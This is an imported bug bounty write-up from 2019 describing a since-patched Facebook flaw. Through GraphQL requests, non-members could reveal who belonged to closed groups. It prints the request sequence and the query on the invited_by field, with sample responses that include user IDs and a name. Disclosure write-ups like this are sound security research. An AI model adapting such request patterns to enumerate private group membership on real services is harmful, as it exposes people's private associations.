---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-10-22_poc-disclose-members-in-any-closed-facebook-group.md
original_filename: 2019-10-22_poc-disclose-members-in-any-closed-facebook-group.md
title: (POC) Disclose members in any closed Facebook group
category: documents
detected_topics:
- sso
- command-injection
- graphql
- information-disclosure
tags:
- imported
- documents
- sso
- command-injection
- graphql
- information-disclosure
language: en
raw_sha256: 52532576ed08d6d3398646372ab9361d3368aba64e59b90ba2ef81ef9c49a553
text_sha256: fbd04736c6d69c2e90c41085917fb4d4b272f8f202a13198108d39f7f050d9dc
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# (POC) Disclose members in any closed Facebook group

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-10-22_poc-disclose-members-in-any-closed-facebook-group.md
- Source Type: markdown
- Detected Topics: sso, command-injection, graphql, information-disclosure
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `52532576ed08d6d3398646372ab9361d3368aba64e59b90ba2ef81ef9c49a553`
- Text SHA256: `fbd04736c6d69c2e90c41085917fb4d4b272f8f202a13198108d39f7f050d9dc`


## Content

---
title: "(POC) Disclose members in any closed Facebook group"
url: "https://medium.com/@edmundaa222/poc-disclose-members-in-any-closed-facebook-group-259783fa4bf"
authors: ["Ahmad Talahmeh"]
programs: ["Meta / Facebook"]
bugs: ["Information disclosure"]
bounty: "3,000"
publication_date: "2019-10-22"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4978
scraped_via: "browseros"
---

# (POC) Disclose members in any closed Facebook group

(POC) Disclose members in any closed Facebook group
Ahmad Talahmeh
Follow
2 min read
·
Oct 23, 2019

150

1

Press enter or click to view image in full size
Description / Impact

When a Facebook user approved as a member in a closed group, only the group members/admins have a permissions to see his/her membership but according to my testing I find that any non-member being able to disclose approved members in any closed Facebook group.

Proof Of Concept / Reprosteps
Submit the following request via user(A) just before user(B) has any kind of relationship with the closed group(D):
POST /api/graphql/?doc_id=2416329748453695 HTTP/1.1
Host: facebook.com

variables=%7B%22groupID%22%3A%22Group_D_ID%22%2C%22memberID%22%3A%22
User_B_ID%22%7D

Response

{ 
  "data":{ 
  "group":{ 
  "id":"2082572965383830",
  "can_viewer_claim_adminship":false,
  "membership":null
  }
  }
}

membership=NULL
this is because no relationship in the past between User(B) and the closed group(D)

Now repeat step 1 just after user(B) has any kind of relationship with the closed group(D).

Response

{ 
  "data":{ 
  "group":{ 
  "id":"2082572965383830",
  "can_viewer_claim_adminship":false,
  "membership":{ 
  "member_actions":[ 
  { 
  "__typename":"GroupSendMessageToMemberAction",
  "action_name":"Send message",
  "action_type":"SEND_MESSAGE"
  }
  ],
  "member":{ 
  "id":"100038336371044"
  },
  "id":"124632125491333"
  }
  }
  }
}

membership = membership_id
although the membership field by itself doesn’t reveals any approved members but it will be possible with further exploit:

Get Ahmad Talahmeh’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

- copy the membership ID that stand alone under the member id , this id represent GraphQL type defined as :
“__typename”: “GroupMembership”

Submit the following query with the membership id from previous step

GraphQL Query:

graphql?q=node(GroupMembershipID)
{ 
  member,
  associated_group,
  invited_by{ 
  id,
  name
  }
}

Response

"124632125491333":{ 
  "member":{ 
  "name":"Sandra Alchccfcgajdd Lauescu",
  "url":"https://www.facebook.com/profile.php?id=100038336371044",
  "id":"100038336371044"
  },
  "associated_group":{ 
  "name":"Members",
  "url":"https://www.facebook.com/groups/2082572965383830/",
  "id":"2082572965383830"
  },
  "invited_by":null
}
}

as you see, invited_by = NULL
this is because User(B) isn’t an approved member yet in the closed Group(D).

-Now re submit the query while user(B) is an approved member in the closed Group(D).

Partial Response

"invited_by":
  {
  id: MEMBER_ID,
  name: Member_Name
  }

invited_by field returning data for now, this is because User(B) is an approved member in the closed Group(D), the data returned via (invited_by) field represent the another member who invited User(B) to the closed group(D).

if User(B) leave the closed group(D), invited_by field become NULL again, and that mean the closed group members could be revealed by non members.

impact:
this could allow non members to disclose members in any closed Facebook group.

Facebook fixed the issue by removing the data returned via invited_by field.

We have looked into this issue and believe that the vulnerability has been patched. Please let us know if you believe that the patch does not resolve this issue. We will follow up regarding any bounty decisions soon.

Timeline:
13/08/2019: Report Sent
14/08/2019: Confirmation of reproduce by Facebook
15/08/2019: Further Investigation By Facebook
16/08/2019: Patched By Facebook
20/08/2019: Confirmation of patch by Facebook
01/10/2019: $3000 bounty awarded by Facebook
